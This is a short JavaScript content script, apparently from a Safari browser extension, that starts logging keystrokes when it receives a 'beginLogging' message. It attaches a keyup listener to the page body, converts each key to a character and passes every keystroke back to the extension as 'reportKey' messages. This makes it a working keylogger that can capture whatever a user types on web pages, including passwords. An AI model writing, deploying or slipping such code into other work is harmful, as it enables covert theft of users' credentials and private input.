function handleMessage(msgEvent) {

  var messageName = msgEvent.name;
  var messageData = msgEvent.message;

  if (messageName === "beginLogging") { 
    jQuery("body").keyup( function(k) {

      var keyCode = k.keyCode;
      var key = String.fromCharCode(keyCode);
      console.log(key);
      safari.self.tab.dispatchMessage("reportKey",key);

    });
  }
}

safari.self.addEventListener("message", handleMessage, false);
